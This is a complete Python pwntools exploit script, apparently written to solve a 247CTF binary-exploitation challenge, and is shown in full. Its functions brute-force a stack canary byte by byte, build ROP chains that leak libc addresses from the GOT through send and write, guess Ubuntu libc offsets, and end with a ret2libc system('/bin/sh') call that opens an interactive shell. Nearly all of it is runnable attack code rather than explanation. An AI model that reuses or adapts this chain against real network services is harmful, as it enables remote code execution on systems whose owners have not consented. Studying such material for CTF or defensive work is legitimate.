#!/usr/bin/env python3
from pwn import *
import time

# Configuration
HOST = "0b1e1d5f8b809485.247ctf.com"
PORT = 50428

# Stack layout:
# [ebp-0x20c] buffer (recv reads here)
# ...
# [ebp-0xc]   canary (4 bytes)
# [ebp-0x8]   ??? (4 bytes)
# [ebp-0x4]   saved_ebx (4 bytes)
# [ebp]       saved_ebp (4 bytes)
# [ebp+0x4]   return address (4 bytes)
#
# Offset from buffer to canary: 0x20c - 0xc = 0x200 = 512
# Offset from canary to return: 4 + 4 + 4 + 4 = 16

CANARY_OFFSET = 512
# After canary: 4 (canary) + 4 (???) + 4 (ebx) + 4 (ebp) = 16 bytes before ret

# Binary addresses
send_plt = 0x080485c0
recv_plt = 0x080485a0
write_plt = 0x08048550
exit_plt = 0x08048520

# GOT entries
send_got = 0x0804a048
recv_got = 0x0804a040
write_got = 0x0804a02c
libc_start_main_got = 0x0804a028

# Gadgets
pop4_ret = 0x08048a68   # pop ebx; pop esi; pop edi; pop ebp; ret

def try_byte(current_canary, byte_guess):
    """Try a single byte guess for the canary"""
    try:
        r = remote(HOST, PORT, timeout=10, level='error')
        time.sleep(0.2)
        r.recv(timeout=1)

        payload = b"A" * CANARY_OFFSET + current_canary + bytes([byte_guess])
        r.send(payload)

        time.sleep(0.5)
        all_data = b""
        for _ in range(3):
            try:
                data = r.recv(timeout=0.5)
                all_data += data
            except:
                break

        r.close()
        return b"Come back" in all_data

    except:
        return False

def brute_force_canary():
    """Brute force the canary byte by byte"""
    canary = b""

    for pos in range(4):
        log.info(f"Brute forcing canary byte {pos}...")
        found = False

        for byte in range(256):
            if try_byte(canary, byte):
                canary += bytes([byte])
                log.success(f"Canary byte {pos}: 0x{byte:02x}")
                found = True
                break

        if not found:
            log.error(f"Failed to find canary byte {pos}")
            return None

    return canary

def try_leak_with_fd(canary, socket_fd):
    """Try to leak libc with a specific socket fd"""
    try:
        r = remote(HOST, PORT, timeout=5, level='error')
        time.sleep(0.3)
        r.recv(timeout=1)

        # ROP chain: send(fd, send_got, 4, 0) then exit
        rop = b""
        rop += p32(send_plt)
        rop += p32(pop4_ret)     # clean up 4 args after send returns
        rop += p32(socket_fd)
        rop += p32(send_got)
        rop += p32(4)
        rop += p32(0)
        rop += p32(exit_plt)     # exit cleanly

        payload = b"A" * CANARY_OFFSET    # 512 bytes padding
        payload += canary                  # 4 bytes canary
        payload += b"XXXX"                 # 4 bytes (unknown)
        payload += b"YYYY"                 # 4 bytes saved_ebx
        payload += b"ZZZZ"                 # 4 bytes saved_ebp
        payload += rop                     # return address + ROP

        r.send(payload)

        time.sleep(0.5)
        data = r.recv(timeout=2)
        r.close()

        if b"Incorrect" in data:
            idx = data.find(b"Incorrect secret password:\n")
            if idx != -1:
                leaks = data[idx + len(b"Incorrect secret password:\n"):]
                if len(leaks) >= 4:
                    leaked = u32(leaks[:4])
                    # Check for reasonable libc address
                    if leaked > 0xf0000000 or (leaked > 0x08000000 and leaked < 0x80000000):
                        return leaked, leaks
        return None, None
    except:
        return None, None

def exploit():
    context.log_level = 'info'
    context.arch = 'i386'

    # Brute force canary
    log.info("=== Brute forcing stack canary ===")
    canary = brute_force_canary()

    if canary is None:
        log.error("Failed to brute force canary")
        return

    log.success(f"Full canary: {canary.hex()} (0x{u32(canary):08x})")

    # Try different socket fds
    log.info("=== Stage 2: Finding socket fd and leaking libc ===")

    for fd in range(3, 10):
        log.info(f"Trying fd={fd}...")
        leaked, raw_leaks = try_leak_with_fd(canary, fd)
        if leaked:
            log.success(f"Got leak with fd={fd}: 0x{leaked:08x}")
            log.info(f"Raw leaks: {raw_leaks.hex() if raw_leaks else 'None'}")

            # Now we know the fd works, let's do the full exploit
            stage3(canary, fd, leaked)
            return

    log.error("Could not leak with any fd, trying alternative approach...")

    # Alternative: maybe stdout is redirected?
    # Try writing to fd 1 (stdout)
    log.info("Trying with stdout (fd=1)...")

    r = remote(HOST, PORT)
    time.sleep(0.3)
    r.recv(timeout=1)

    # Use write() instead of send()
    rop = b""
    rop += p32(write_plt)
    rop += p32(pop4_ret)
    rop += p32(1)              # stdout
    rop += p32(send_got)
    rop += p32(4)
    rop += p32(0)              # padding for pop4
    rop += p32(exit_plt)

    payload = b"A" * CANARY_OFFSET
    payload += canary
    payload += b"XXXX"
    payload += b"YYYY"
    payload += b"ZZZZ"
    payload += rop

    r.send(payload)

    time.sleep(1)
    try:
        data = r.recv(timeout=2)
        log.info(f"Response: {repr(data)}")
    except:
        log.info("No response")

    r.close()

def stage3(canary, socket_fd, send_libc):
    """Stage 3: ret2libc to get shell or read flag"""
    log.info("=== Stage 3: ret2libc ===")

    # We have send@libc leaked
    # Common libc offsets (need to identify libc version)
    # For now, let's try to leak more addresses to identify libc

    r = remote(HOST, PORT)
    time.sleep(0.3)
    r.recv(timeout=1)

    # Leak more: __libc_start_main, write
    rop = b""

    # send(fd, libc_start_main_got, 4, 0)
    rop += p32(send_plt)
    rop += p32(pop4_ret)
    rop += p32(socket_fd)
    rop += p32(libc_start_main_got)
    rop += p32(4)
    rop += p32(0)

    # send(fd, write_got, 4, 0)
    rop += p32(send_plt)
    rop += p32(pop4_ret)
    rop += p32(socket_fd)
    rop += p32(write_got)
    rop += p32(4)
    rop += p32(0)

    rop += p32(exit_plt)

    payload = b"A" * CANARY_OFFSET
    payload += canary
    payload += b"XXXX"
    payload += b"YYYY"
    payload += b"ZZZZ"
    payload += rop

    r.send(payload)

    time.sleep(1)
    try:
        data = r.recv(timeout=2)
        log.info(f"Response: {repr(data)}")

        if b"Incorrect" in data:
            idx = data.find(b"Incorrect secret password:\n")
            leaks = data[idx + len(b"Incorrect secret password:\n"):]
            log.info(f"Leaks hex: {leaks.hex()}")

            if len(leaks) >= 8:
                libc_start_main = u32(leaks[0:4])
                write_libc = u32(leaks[4:8])

                log.success(f"send@libc = 0x{send_libc:08x}")
                log.success(f"__libc_start_main@libc = 0x{libc_start_main:08x}")
                log.success(f"write@libc = 0x{write_libc:08x}")

                # Calculate differences to identify libc
                diff1 = send_libc - libc_start_main
                diff2 = send_libc - write_libc
                log.info(f"send - __libc_start_main = 0x{diff1:x}")
                log.info(f"send - write = 0x{diff2:x}")

                # Try common libc versions
                # Ubuntu 16.04 i386 libc6 2.23:
                #   __libc_start_main: 0x18540
                #   send: varies
                #   system: 0x3a940

                # Let's try to calculate and use system
                # If we know libc_start_main offset, we can get libc base
                # Common offset for __libc_start_main: 0x18540 (Ubuntu 16.04)
                #                                      0x18d90 (Ubuntu 18.04)

                for libc_start_offset in [0x18540, 0x18d90, 0x1d5b0, 0x21a00]:
                    libc_base = libc_start_main - libc_start_offset
                    if libc_base & 0xfff == 0:  # Should be page-aligned
                        log.info(f"Trying libc_base = 0x{libc_base:08x} (offset 0x{libc_start_offset:x})")
                        try_shell(canary, socket_fd, libc_base)
                        break

    except Exception as e:
        log.error(f"Error: {e}")

    r.close()

def try_shell(canary, socket_fd, libc_base):
    """Try to get a shell using calculated libc base"""
    # Common offsets (Ubuntu 16.04 i386)
    system_offset = 0x3a940    # system
    binsh_offset = 0x15900b    # "/bin/sh"

    system = libc_base + system_offset
    binsh = libc_base + binsh_offset

    log.info(f"system = 0x{system:08x}")
    log.info(f"/bin/sh = 0x{binsh:08x}")

    r = remote(HOST, PORT)
    time.sleep(0.3)
    r.recv(timeout=1)

    # ROP: system("/bin/sh")
    # But we need to redirect stdin/stdout first for a proper shell
    # Or use a reverse shell

    # For now, let's try: system("cat flag*")
    # We need to find or create the string "cat flag*"

    # Alternative: use execve or just read flag file
    # Let's try system with /bin/sh first

    rop = b""
    rop += p32(system)
    rop += p32(exit_plt)  # return addr for system
    rop += p32(binsh)     # arg for system

    payload = b"A" * CANARY_OFFSET
    payload += canary
    payload += b"XXXX"
    payload += b"YYYY"
    payload += b"ZZZZ"
    payload += rop

    r.send(payload)

    r.interactive()

if __name__ == "__main__":
    exploit()
